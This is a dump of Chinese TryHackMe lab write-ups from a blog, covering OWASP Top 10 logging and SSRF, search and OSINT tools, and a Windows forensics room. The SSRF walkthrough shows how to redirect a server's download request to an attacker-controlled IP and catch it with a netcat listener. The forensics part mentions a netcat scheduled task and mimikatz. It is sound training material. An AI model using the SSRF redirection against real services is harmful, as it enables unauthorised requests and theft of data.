应用程序时，应记录用户执行的每个操作。记录很重要，因为一旦发生事件，攻击者的活动就会被追踪。一旦追踪到他们的行为，就可以确定他们的风险和影响。如果没有记录，就无法知道攻击者在获得特定 Web 应用程序的访问权限后执行了哪些操作。</p>\n<p>日志中存储的信息应包括以下内容：</p>\n<ul>\n<li>HTTP状态代码</li>\n<li>时间戳</li>\n<li>用户名</li>\n<li>API端点&#x2F;页面位置</li>\n<li>IP 地址</li>\n</ul>\n<p>下载日志看看</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task9.png\" alt=\"task9\"></p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/log.png\" alt=\"task9\"></p>\n<p>看到连续几个相同的ip盲猜就是攻击者ip</p>\n<p>这样看的话就是暴力破解</p>\n<h2 id=\"10-服务器端请求伪造（SSRF）\"><a href=\"#10-服务器端请求伪造（SSRF）\" class=\"headerlink\" title=\"10 服务器端请求伪造（SSRF）\"></a>10 服务器端请求伪造（SSRF）</h2><p>这种类型的漏洞发生在攻击者可以强迫 Web 应用程序代表他们向任意目的地发送请求，同时控制请求本身的内容时。SSRF漏洞通常出现在我们的 Web 应用程序需要使用第三方服务的实现中。</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/task10.png\" alt=\"task10\"></p>\n<p>依旧进入网站 发现是个类似博客的东西 周围找找看有什么可以做的吗</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/admin.png\" alt=\"task10\"></p>\n<p>点进去发现 要localhost才能进去</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/localhost.png\" alt=\"task\"></p>\n<p>第二问 问点击下载按钮。服务器参数指向哪里？</p>\n<p>直接f12 找到下载按钮 发现了下载路径</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/down.png\" alt=\"task\"></p>\n<p>这个路径也有大作用 正常来说我们下载那个pdf使用这个路径</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://10.10.234.129:8087/download?server=secure-file-storage.com:8087&amp;id=75482342</span><br></pre></td></tr></table></figure>\n\n<p>我们要把后面的server&#x3D;的值改成attackbox或者是你虚拟机连openvpn的ip 其他都不动</p>\n<p>然后打开终端 设置监听 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvnp 8087</span><br></pre></td></tr></table></figure>\n\n<p>启动完就把改好的网址在浏览器那搜索一下 终端就能找到flag</p>\n<p><img src=\"/images/tryhackme-OWASP-Top-10-2021/api1.png\" alt=\"ask\"></p>\n<p>于是乎 把thm的owasp top-10简单介绍一下了 过段时间继续学习更新owasp top-1o！！！</p>\n"},{"title":"信息搜集之搜索","date":"2025-01-23T00:54:54.000Z","top_img":"transparent","cover":"https://s2.loli.net/2025/02/01/wmdJujK4AO2iMYb.jpg","_content":"\n# search skill\n\n## task2\n评估信息时需要考虑的几点：\n\n1.来源：确定发布信息的作者或组织。考虑他们是否在该主题上享有声誉和权威。发表博客文章并不代表某人在该主题上具有权威性。\n2.证据和推理：检查主张是否有可靠的证据和逻辑推理。我们寻求确凿的事实和有力的论据。\n3.客观性和偏见性：评估信息是否公正合理地呈现，是否反映了多种观点。我们不关心作者推动阴暗议程，无论是为了推销产品还是攻击竞争对手。\n4.确证和一致性：通过多个独立来源的确证来验证所呈现的信息。检查多个可靠且信誉良好的来源是否同意核心主张。\n\n![task](/images/信息搜集之搜索/屏幕截图%202025-01-23%20090909.png)\n答案\n\nsnake oli\n\nss\n\n\n## task3 \n第三部分其实讲的是搜索引擎 介绍了些搜索运算符 我补充点 \n\n### 基础运算符\n“精确匹配”\n使用双引号可以搜索与引号中的关键字或短语完全匹配的内容。例如：\n\"数字营销策略\"：仅返回包含该完整短语的页面。\n\nAND（逻辑与）\n在两个搜索词之间使用 AND，可以确保结果中同时包含这两个词。例如：\nSEO AND 优化：返回同时包含“SEO”和“优化”的页面。\n\nOR（逻辑或）\n使用 OR 或竖线 | 可以搜索包含其中一个或多个词的结果。例如：\nSEO OR \"搜索引擎优化\"：返回包含“SEO”或“搜索引擎优化”的页面。\n\n-（排除）\n在搜索词前加 - 可以排除特定词。例如：\nSEO -营销：返回包含“SEO”但不包含“营销”的页面。\n\n*（通配符）\n使用 * 可以匹配任意单词或短语。例如：\n数字 * 策略：返回包含“数字”和“策略”之间任意单词的页面。\n\n### 高级搜索运算符\nsite:\n限制搜索结果来自特定网站。例如：\nsite:example.com SEO：仅在 example.com 网站内搜索包含“SEO”的页面。\n\nintitle:\n查找标题中包含特定词的页面。例如：\nintitle:SEO：返回标题中包含“SEO”的页面。\n\ninurl:\n查找 URL 中包含特定词的页面。例如：\ninurl:SEO：返回 URL 中包含“SEO”的页面。\n\nfiletype:\n搜索特定文件类型的文档。例如：\nfiletype:pdf SEO：返回包含“SEO”的 PDF 文件。\n\nrelated:\n查找与某个网站相关的其他网站。例如：\nrelated:example.com：返回与 example.com 相关的网站。\n\nallintitle:\n查找标题中包含所有指定词的页面。例如：\nallintitle:SEO 策略：返回标题中同时包含“SEO”和“策略”的页面。\n\n![task3](/images/信息搜集之搜索/task3.png)\n\n第一题 我们就可以这么搜 filetype:pdf cyber warfare report\n\n第二题 ss(socket statistics)\n\n## task4\n接下来轮到专业搜索引擎 信息收集主要也是靠这些\n比如说shodan \n\nVirus Total是一个在线网站，使用多种防病毒引擎提供文件病毒扫描服务。它允许用户上传文件或提供 URL，以便通过单一操作使用多种防病毒引擎和网站扫描程序对其进行扫描。他们甚至可以输入文件哈希来检查之前上传的文件的结果。\n\nensys 专注于与互联网连接的主机、网站、证书和其他互联网资产。    \n\n![task4](/images/信息搜集之搜索/task4.png)\n\n我们在shodan中搜lghttpd就可以知道是us\n\n第二天我们把hash值粘贴进Virus Total就能知道是啥\n\n## task5\n漏洞 可以到cnnvd国家信息安全漏洞库 cnvd 国家信息安全漏洞共享平台里面查看\n\nexploit-db 漏洞数据库列出了来自不同作者的漏洞代码；其中一些漏洞代码已经过测试并标记为已验证\n\n还有nist可以去康康\n\n题目\n![](/images/信息搜集之搜索/task5.png)\n\n我们可以在nist里面搜一下这个编号 看描述知道是来自xz的\n\n\n## task6\n技术文档 有时候东西解不出来 是去看看官方的文档 往往在里面就有解决方案或者一些一下灵感\n\n![task6](/source/images/信息搜集之搜索/task6.png)\n\n\n## task 7\n就是社交媒体 有点社工学的感觉了 从社交媒体的蛛丝马迹中寻找\n\n![task7](/source/images/信息搜集之搜索/task7.png)\n\n第一问这个东东叫领英 好像是这么翻译的 就是比较严肃点的社交媒体\n\n第二问 Facebook就是日常风的社交媒体\n\n","source":"_posts/tryhackme的搜索技巧.md","raw":"---\ntitle: 信息搜集之搜索\ndate: 2025-01-23 08:54:54\ntags: 信息搜集 入门\ntop_img: transparent\ncover: https://s2.loli.net/2025/02/01/wmdJujK4AO2iMYb.jpg\n---\n\n# search skill\n\n## task2\n评估信息时需要考虑的几点：\n\n1.来源：确定发布信息的作者或组织。考虑他们是否在该主题上享有声誉和权威。发表博客文章并不代表某人在该主题上具有权威性。\n2.证据和推理：检查主张是否有可靠的证据和逻辑推理。我们寻求确凿的事实和有力的论据。\n3.客观性和偏见性：评估信息是否公正合理地呈现，是否反映了多种观点。我们不关心作者推动阴暗议程，无论是为了推销产品还是攻击竞争对手。\n4.确证和一致性：通过多个独立来源的确证来验证所呈现的信息。检查多个可靠且信誉良好的来源是否同意核心主张。\n\n![task](/images/信息搜集之搜索/屏幕截图%202025-01-23%20090909.png)\n答案\n\nsnake oli\n\nss\n\n\n## task3 \n第三部分其实讲的是搜索引擎 介绍了些搜索运算符 我补充点 \n\n### 基础运算符\n“精确匹配”\n使用双引号可以搜索与引号中的关键字或短语完全匹配的内容。例如：\n\"数字营销策略\"：仅返回包含该完整短语的页面。\n\nAND（逻辑与）\n在两个搜索词之间使用 AND，可以确保结果中同时包含这两个词。例如：\nSEO AND 优化：返回同时包含“SEO”和“优化”的页面。\n\nOR（逻辑或）\n使用 OR 或竖线 | 可以搜索包含其中一个或多个词的结果。例如：\nSEO OR \"搜索引擎优化\"：返回包含“SEO”或“搜索引擎优化”的页面。\n\n-（排除）\n在搜索词前加 - 可以排除特定词。例如：\nSEO -营销：返回包含“SEO”但不包含“营销”的页面。\n\n*（通配符）\n使用 * 可以匹配任意单词或短语。例如：\n数字 * 策略：返回包含“数字”和“策略”之间任意单词的页面。\n\n### 高级搜索运算符\nsite:\n限制搜索结果来自特定网站。例如：\nsite:example.com SEO：仅在 example.com 网站内搜索包含“SEO”的页面。\n\nintitle:\n查找标题中包含特定词的页面。例如：\nintitle:SEO：返回标题中包含“SEO”的页面。\n\ninurl:\n查找 URL 中包含特定词的页面。例如：\ninurl:SEO：返回 URL 中包含“SEO”的页面。\n\nfiletype:\n搜索特定文件类型的文档。例如：\nfiletype:pdf SEO：返回包含“SEO”的 PDF 文件。\n\nrelated:\n查找与某个网站相关的其他网站。例如：\nrelated:example.com：返回与 example.com 相关的网站。\n\nallintitle:\n查找标题中包含所有指定词的页面。例如：\nallintitle:SEO 策略：返回标题中同时包含“SEO”和“策略”的页面。\n\n![task3](/images/信息搜集之搜索/task3.png)\n\n第一题 我们就可以这么搜 filetype:pdf cyber warfare report\n\n第二题 ss(socket statistics)\n\n## task4\n接下来轮到专业搜索引擎 信息收集主要也是靠这些\n比如说shodan \n\nVirus Total是一个在线网站，使用多种防病毒引擎提供文件病毒扫描服务。它允许用户上传文件或提供 URL，以便通过单一操作使用多种防病毒引擎和网站扫描程序对其进行扫描。他们甚至可以输入文件哈希来检查之前上传的文件的结果。\n\nensys 专注于与互联网连接的主机、网站、证书和其他互联网资产。    \n\n![task4](/images/信息搜集之搜索/task4.png)\n\n我们在shodan中搜lghttpd就可以知道是us\n\n第二天我们把hash值粘贴进Virus Total就能知道是啥\n\n## task5\n漏洞 可以到cnnvd国家信息安全漏洞库 cnvd 国家信息安全漏洞共享平台里面查看\n\nexploit-db 漏洞数据库列出了来自不同作者的漏洞代码；其中一些漏洞代码已经过测试并标记为已验证\n\n还有nist可以去康康\n\n题目\n![](/images/信息搜集之搜索/task5.png)\n\n我们可以在nist里面搜一下这个编号 看描述知道是来自xz的\n\n\n## task6\n技术文档 有时候东西解不出来 是去看看官方的文档 往往在里面就有解决方案或者一些一下灵感\n\n![task6](/source/images/信息搜集之搜索/task6.png)\n\n\n## task 7\n就是社交媒体 有点社工学的感觉了 从社交媒体的蛛丝马迹中寻找\n\n![task7](/source/images/信息搜集之搜索/task7.png)\n\n第一问这个东东叫领英 好像是这么翻译的 就是比较严肃点的社交媒体\n\n第二问 Facebook就是日常风的社交媒体\n\n","slug":"tryhackme的搜索技巧","published":1,"updated":"2025-02-01T10:47:35.542Z","comments":1,"layout":"post","photos":[],"_id":"cm74njvxk0012tsg6ccloejnv","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><h1 id=\"search-skill\"><a href=\"#search-skill\" class=\"headerlink\" title=\"search skill\"></a>search skill</h1><h2 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h2><p>评估信息时需要考虑的几点：</p>\n<p>1.来源：确定发布信息的作者或组织。考虑他们是否在该主题上享有声誉和权威。发表博客文章并不代表某人在该主题上具有权威性。<br>2.证据和推理：检查主张是否有可靠的证据和逻辑推理。我们寻求确凿的事实和有力的论据。<br>3.客观性和偏见性：评估信息是否公正合理地呈现，是否反映了多种观点。我们不关心作者推动阴暗议程，无论是为了推销产品还是攻击竞争对手。<br>4.确证和一致性：通过多个独立来源的确证来验证所呈现的信息。检查多个可靠且信誉良好的来源是否同意核心主张。</p>\n<p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-23%20090909.png\" alt=\"task\"><br>答案</p>\n<p>snake oli</p>\n<p>ss</p>\n<h2 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p>第三部分其实讲的是搜索引擎 介绍了些搜索运算符 我补充点 </p>\n<h3 id=\"基础运算符\"><a href=\"#基础运算符\" class=\"headerlink\" title=\"基础运算符\"></a>基础运算符</h3><p>“精确匹配”<br>使用双引号可以搜索与引号中的关键字或短语完全匹配的内容。例如：<br>“数字营销策略”：仅返回包含该完整短语的页面。</p>\n<p>AND（逻辑与）<br>在两个搜索词之间使用 AND，可以确保结果中同时包含这两个词。例如：<br>SEO AND 优化：返回同时包含“SEO”和“优化”的页面。</p>\n<p>OR（逻辑或）<br>使用 OR 或竖线 | 可以搜索包含其中一个或多个词的结果。例如：<br>SEO OR “搜索引擎优化”：返回包含“SEO”或“搜索引擎优化”的页面。</p>\n<p>-（排除）<br>在搜索词前加 - 可以排除特定词。例如：<br>SEO -营销：返回包含“SEO”但不包含“营销”的页面。</p>\n<p>*（通配符）<br>使用 * 可以匹配任意单词或短语。例如：<br>数字 * 策略：返回包含“数字”和“策略”之间任意单词的页面。</p>\n<h3 id=\"高级搜索运算符\"><a href=\"#高级搜索运算符\" class=\"headerlink\" title=\"高级搜索运算符\"></a>高级搜索运算符</h3><p>site:<br>限制搜索结果来自特定网站。例如：<br>site:example.com SEO：仅在 example.com 网站内搜索包含“SEO”的页面。</p>\n<p>intitle:<br>查找标题中包含特定词的页面。例如：<br>intitle:SEO：返回标题中包含“SEO”的页面。</p>\n<p>inurl:<br>查找 URL 中包含特定词的页面。例如：<br>inurl:SEO：返回 URL 中包含“SEO”的页面。</p>\n<p>filetype:<br>搜索特定文件类型的文档。例如：<br>filetype:pdf SEO：返回包含“SEO”的 PDF 文件。</p>\n<p>related:<br>查找与某个网站相关的其他网站。例如：<br>related:example.com：返回与 example.com 相关的网站。</p>\n<p>allintitle:<br>查找标题中包含所有指定词的页面。例如：<br>allintitle:SEO 策略：返回标题中同时包含“SEO”和“策略”的页面。</p>\n<p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2/task3.png\" alt=\"task3\"></p>\n<p>第一题 我们就可以这么搜 filetype:pdf cyber warfare report</p>\n<p>第二题 ss(socket statistics)</p>\n<h2 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p>接下来轮到专业搜索引擎 信息收集主要也是靠这些<br>比如说shodan </p>\n<p>Virus Total是一个在线网站，使用多种防病毒引擎提供文件病毒扫描服务。它允许用户上传文件或提供 URL，以便通过单一操作使用多种防病毒引擎和网站扫描程序对其进行扫描。他们甚至可以输入文件哈希来检查之前上传的文件的结果。</p>\n<p>ensys 专注于与互联网连接的主机、网站、证书和其他互联网资产。    </p>\n<p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2/task4.png\" alt=\"task4\"></p>\n<p>我们在shodan中搜lghttpd就可以知道是us</p>\n<p>第二天我们把hash值粘贴进Virus Total就能知道是啥</p>\n<h2 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p>漏洞 可以到cnnvd国家信息安全漏洞库 cnvd 国家信息安全漏洞共享平台里面查看</p>\n<p>exploit-db 漏洞数据库列出了来自不同作者的漏洞代码；其中一些漏洞代码已经过测试并标记为已验证</p>\n<p>还有nist可以去康康</p>\n<p>题目<br><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2/task5.png\"></p>\n<p>我们可以在nist里面搜一下这个编号 看描述知道是来自xz的</p>\n<h2 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p>技术文档 有时候东西解不出来 是去看看官方的文档 往往在里面就有解决方案或者一些一下灵感</p>\n<p><img src=\"/source/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2/task6.png\" alt=\"task6\"></p>\n<h2 id=\"task-7\"><a href=\"#task-7\" class=\"headerlink\" title=\"task 7\"></a>task 7</h2><p>就是社交媒体 有点社工学的感觉了 从社交媒体的蛛丝马迹中寻找</p>\n<p><img src=\"/source/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2/task7.png\" alt=\"task7\"></p>\n<p>第一问这个东东叫领英 好像是这么翻译的 就是比较严肃点的社交媒体</p>\n<p>第二问 Facebook就是日常风的社交媒体</p>\n","excerpt":"","more":"<h1 id=\"search-skill\"><a href=\"#search-skill\" class=\"headerlink\" title=\"search skill\"></a>search skill</h1><h2 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h2><p>评估信息时需要考虑的几点：</p>\n<p>1.来源：确定发布信息的作者或组织。考虑他们是否在该主题上享有声誉和权威。发表博客文章并不代表某人在该主题上具有权威性。<br>2.证据和推理：检查主张是否有可靠的证据和逻辑推理。我们寻求确凿的事实和有力的论据。<br>3.客观性和偏见性：评估信息是否公正合理地呈现，是否反映了多种观点。我们不关心作者推动阴暗议程，无论是为了推销产品还是攻击竞争对手。<br>4.确证和一致性：通过多个独立来源的确证来验证所呈现的信息。检查多个可靠且信誉良好的来源是否同意核心主张。</p>\n<p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-01-23%20090909.png\" alt=\"task\"><br>答案</p>\n<p>snake oli</p>\n<p>ss</p>\n<h2 id=\"task3\"><a href=\"#task3\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p>第三部分其实讲的是搜索引擎 介绍了些搜索运算符 我补充点 </p>\n<h3 id=\"基础运算符\"><a href=\"#基础运算符\" class=\"headerlink\" title=\"基础运算符\"></a>基础运算符</h3><p>“精确匹配”<br>使用双引号可以搜索与引号中的关键字或短语完全匹配的内容。例如：<br>“数字营销策略”：仅返回包含该完整短语的页面。</p>\n<p>AND（逻辑与）<br>在两个搜索词之间使用 AND，可以确保结果中同时包含这两个词。例如：<br>SEO AND 优化：返回同时包含“SEO”和“优化”的页面。</p>\n<p>OR（逻辑或）<br>使用 OR 或竖线 | 可以搜索包含其中一个或多个词的结果。例如：<br>SEO OR “搜索引擎优化”：返回包含“SEO”或“搜索引擎优化”的页面。</p>\n<p>-（排除）<br>在搜索词前加 - 可以排除特定词。例如：<br>SEO -营销：返回包含“SEO”但不包含“营销”的页面。</p>\n<p>*（通配符）<br>使用 * 可以匹配任意单词或短语。例如：<br>数字 * 策略：返回包含“数字”和“策略”之间任意单词的页面。</p>\n<h3 id=\"高级搜索运算符\"><a href=\"#高级搜索运算符\" class=\"headerlink\" title=\"高级搜索运算符\"></a>高级搜索运算符</h3><p>site:<br>限制搜索结果来自特定网站。例如：<br>site:example.com SEO：仅在 example.com 网站内搜索包含“SEO”的页面。</p>\n<p>intitle:<br>查找标题中包含特定词的页面。例如：<br>intitle:SEO：返回标题中包含“SEO”的页面。</p>\n<p>inurl:<br>查找 URL 中包含特定词的页面。例如：<br>inurl:SEO：返回 URL 中包含“SEO”的页面。</p>\n<p>filetype:<br>搜索特定文件类型的文档。例如：<br>filetype:pdf SEO：返回包含“SEO”的 PDF 文件。</p>\n<p>related:<br>查找与某个网站相关的其他网站。例如：<br>related:example.com：返回与 example.com 相关的网站。</p>\n<p>allintitle:<br>查找标题中包含所有指定词的页面。例如：<br>allintitle:SEO 策略：返回标题中同时包含“SEO”和“策略”的页面。</p>\n<p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2/task3.png\" alt=\"task3\"></p>\n<p>第一题 我们就可以这么搜 filetype:pdf cyber warfare report</p>\n<p>第二题 ss(socket statistics)</p>\n<h2 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p>接下来轮到专业搜索引擎 信息收集主要也是靠这些<br>比如说shodan </p>\n<p>Virus Total是一个在线网站，使用多种防病毒引擎提供文件病毒扫描服务。它允许用户上传文件或提供 URL，以便通过单一操作使用多种防病毒引擎和网站扫描程序对其进行扫描。他们甚至可以输入文件哈希来检查之前上传的文件的结果。</p>\n<p>ensys 专注于与互联网连接的主机、网站、证书和其他互联网资产。    </p>\n<p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2/task4.png\" alt=\"task4\"></p>\n<p>我们在shodan中搜lghttpd就可以知道是us</p>\n<p>第二天我们把hash值粘贴进Virus Total就能知道是啥</p>\n<h2 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p>漏洞 可以到cnnvd国家信息安全漏洞库 cnvd 国家信息安全漏洞共享平台里面查看</p>\n<p>exploit-db 漏洞数据库列出了来自不同作者的漏洞代码；其中一些漏洞代码已经过测试并标记为已验证</p>\n<p>还有nist可以去康康</p>\n<p>题目<br><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2/task5.png\"></p>\n<p>我们可以在nist里面搜一下这个编号 看描述知道是来自xz的</p>\n<h2 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p>技术文档 有时候东西解不出来 是去看看官方的文档 往往在里面就有解决方案或者一些一下灵感</p>\n<p><img src=\"/source/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2/task6.png\" alt=\"task6\"></p>\n<h2 id=\"task-7\"><a href=\"#task-7\" class=\"headerlink\" title=\"task 7\"></a>task 7</h2><p>就是社交媒体 有点社工学的感觉了 从社交媒体的蛛丝马迹中寻找</p>\n<p><img src=\"/source/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E4%B9%8B%E6%90%9C%E7%B4%A2/task7.png\" alt=\"task7\"></p>\n<p>第一问这个东东叫领英 好像是这么翻译的 就是比较严肃点的社交媒体</p>\n<p>第二问 Facebook就是日常风的社交媒体</p>\n"},{"title":"一个入门的Investigating Windows教程","top_img":"transparent","cover":"https://s2.loli.net/2025/01/19/DZvSyrbCaKe4jf9.jpg","_content":"\n最近也是开始放寒假了，从网上知道了try hack me这个网址 刚好本人的技术又不咋地 于是决定好好提升一下技术 从最简单的基础部分开始。\n\n![主题](/images/一个入门教程/屏幕截图%202025-01-14%20201646.png)\n\n这次使用了cmd powershell 注册表 计算机管理 任务计划程序 事件查看器 防火墙 c盘的system32的文件 ~~(省流）~~都是蛮基础的windows工具\n\n---\n我们来看看第一道题\n\n![第一题](/images/一个入门教程/屏幕截图%202025-01-14%20201913.png)\n大致意思就是这个windows机器的版本和年份是什么\n\n进入主机之后 直接点击设置 在其中查看操作系统的版本号为windows server 2016\n\n![第一题解释](/images/一个入门教程/屏幕截图%202025-01-14%20145316.png)\n\n第二种办法就是在cmd中输入**systeminfo** 查看版本信息\n\n![第一题解释](/images/一个入门教程/屏幕截图%202025-01-14%20202928.png)\n\n---\n下一题 题目大意谁是最晚登录的\n\n![第二题](/images/一个入门教程/屏幕截图%202025-01-14%20203100.png)\n\n我们现在cmd里面输入net user 先查看有哪些用户\n\n![第二题解释1](/images/一个入门教程/屏幕截图%202025-01-14%20203406.png)\n\n发现有五个用户 我们用net user 用户名 来一个一个排查 对比last logon的时间可以知道最后一个是administraor\n\n![第二题解释1](/images/一个入门教程/屏幕截图%202025-01-14%20203524.png)\n\n当然 这是个土办法 我们还有一招 打开powershell 输入以下指令\n```\nget-localuser |select name,lastlogon\n```\n![第二题解释2](/images/一个入门教程/屏幕截图%202025-01-15%20090059.png)\n\n很简单明了的可以看出谁是最后一个登录的用户\n~~其实顺便下面一道题 把john的做最后登录时间查出来了~~\n\n---\n下面一题\n\n![第三题](/images/一个入门教程/屏幕截图%202025-01-14%20203706.png)\n\n这题我们使用net user john来查看时间 \n\n![第三题解释](/images/一个入门教程/屏幕截图%202025-01-14%20203826.png)\n\n---\n接着下一题\n\n![第四题](/images/一个入门教程/屏幕截图%202025-01-14%20204914.png)\n\n看这个ip的话有一个很nt的方法 在你打开这个机的时候 前几分钟会弹出一个终端 那上面写着ip\n\n![第四题解释1](/images/一个入门教程/屏幕截图%202025-01-14%20150219.png)\n\n正经办法还有一个 就是在注册表里面查找那个程序 **\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run** 你就会发现这个程序的ip\n\n![第四题解释2](/images/一个入门教程/屏幕截图%202025-01-15%20090843.png)\n\n---\n接下来是哪几个用户是属于administraor组\n\n![第五题](/images/一个入门教程/屏幕截图%202025-01-15%20091809.png)\n\n直接在计算机管理里面查看administraor组里面有谁就可以了\n\n![第五题解释](/images/一个入门教程/屏幕截图%202025-01-15%20091600.png)\n\n---\n下面几个题 可以一起解决了\n\n![第六题](/images/一个入门教程/屏幕截图%202025-01-15%20092017.png)\n\n其实我们可以大致猜出他是个恶意程序 可以到任务计划程序中查找\n\n![第六题解释1](/images/一个入门教程/屏幕截图%202025-01-15%20092603.png) \n\n我们可以发现这个明显和别的任务有区别 我们点击action进行查看详细的信息\n\n![第六题解释2](/images/一个入门教程/屏幕截图%202025-01-15%20092427.png) \n\n可以知道运行的文件为nc.ps1 端口是1348\n\n---\n下一题 jenny最后一次登录是啥时候\n\n![第七题](/images/一个入门教程/屏幕截图%202025-01-15%20092902.png) \n\n直接net user jenny 发现人家压根就没登陆过\n\n![第七题解释1](/images/一个入门教程/屏幕截图%202025-01-15%20093023.png)\n\n---\n这些东西是怎么来的\n\n![第八题](/images/一个入门教程/屏幕截图%202025-01-15%20093156.png)\n\n打开c盘文件夹 发现一个突兀的文件夹tmp 第六感告诉我这个文件夹绝壁有问题 直接打开 查看里面的文件的时间 19年3月2日 \n\n![第八题解释](/images/一个入门教程/屏幕截图%202025-01-15%20093508.png)\n\n---\n\n一次的特殊权限的新登录（原谅我的瞎寄吧翻译）\n\n![第九题](/images/一个入门教程/屏幕截图%202025-01-15%20093542.png)\n\n这题的话蛮有意思的 我是在事件发生器里面的security筛选4672（问了度娘 这个就是题目需要的Special privileges assigned to new logon.）\n\n结果死活找不到需要的。后来我去观摩了一下大佬的做法，上面一道题不是知道最早登录的时间嘛 19年3月2日 用筛选器选出这一天的4672的所有记录 再根据提示 秒是49，就在里面找到了一个记录。\n\n![第九题](/images/一个入门教程/屏幕截图%202025-01-15%20094502.png)\n\n啥工具搞密码\n\n![第十题](/images/一个入门教程/屏幕截图%202025-01-15%20094900.png)\n\n这题挺好的 mimikatz直接秒了（点开这个机子 时不时就有个mimikatz弹窗） 还有一招 点开tmp文件的min-out文件 里面可以看到\n\n![第十题](/images/一个入门教程/屏幕截图%202025-01-15%20094950.png)\n\n最后一波问题\n\n![最后一波](/images/一个入门教程/屏幕截图%202025-01-15%20095638.png)\n\n打开c盘的C:\\Windows\\System32\\drivers\\etc的host文件 \n\n![最后一波](/images/一个入门教程/屏幕截图%202025-01-15%20095508.png)\n\n这两个谷歌的ip感觉不太对劲哦 最后一题就可以直接输入google.com 第一题ip就是76.32.97.132\n\n---\n第二题 题目刚好涉及到了网站服务器 windows就是iis服务 我们去c盘找一下有啥线索吗\n\ninetpub文件夹是iis服务端的一个核心部分 网站目录啥的都存储在那 我们可以进去找找有什么线索吗\n\n![最后一波](/images/一个入门教程/屏幕截图%202025-01-15%20101030.png)\n\n---\n第三题端口 可以在防火墙里面查看 发现是1337\n\n![最后一波](/images/一个入门教程/屏幕截图%202025-01-15%20100137.png)\n\n就这样 完成了第一个room。其实这个还算是基础的room 来给我们熟悉一下 我们遇到问题要去哪个区域查找我们想要的数据\n\n\n\n\n\n","source":"_posts/一个入门的Investigating Windows教程.md","raw":"---\ntitle: 一个入门的Investigating Windows教程\ntop_img: transparent\ncover: https://s2.loli.net/2025/01/19/DZvSyrbCaKe4jf9.jpg\n---\n\n最近也是开始放寒假了，从网上知道了try hack me这个网址 刚好本人的技术又不咋地 于是决定好好提升一下技术 从最简单的基础部分开始。\n\n![主题](/images/一个入门教程/屏幕截图%202025-01-14%20201646.png)\n\n这次使用了cmd powershell 注册表 计算机管理 任务计划程序 事件查看器 防火墙 c盘的system32的文件 ~~(省流）~~都是蛮基础的windows工具\n\n---\n我们来看看第一道题\n\n![第一题](/images/一个入门教程/屏幕截图%202025-01-14%20201913.png)\n大致意思就是这个windows机器的版本和年份是什么\n\n进入主机之后 直接点击设置 在其中查看操作系统的版本号为windows server 2016\n\n![第一题解释](/images/一个入门教程/屏幕截图%202025-01-14%20145316.png)\n\n第二种办法就是在cmd中输入**systeminfo** 查看版本信息\n\n![第一题解释](/images/一个入门教程/屏幕截图%202025-01-14%20202928.png)\n\n---\n下一题 题目大意谁是最晚登录的\n\n![第二题](/images/一个入门教程/屏幕截图%202025-01-14%20203100.png)\n\n我们现在cmd里面输入net user 先查看有哪些用户\n\n![第二题解释1](/images/一个入门教程/屏幕截图%202025-01-14%20203406.png)\n\n发现有五个用户 我们用net user 用户名 来一个一个排查 对比last logon的时间可以知道最后一个是administraor\n\n![第二题解释1](/images/一个入门教程/屏幕截图%202025-01-14%20203524.png)\n\n当然 这是个土办法 我们还有一招 打开powershell 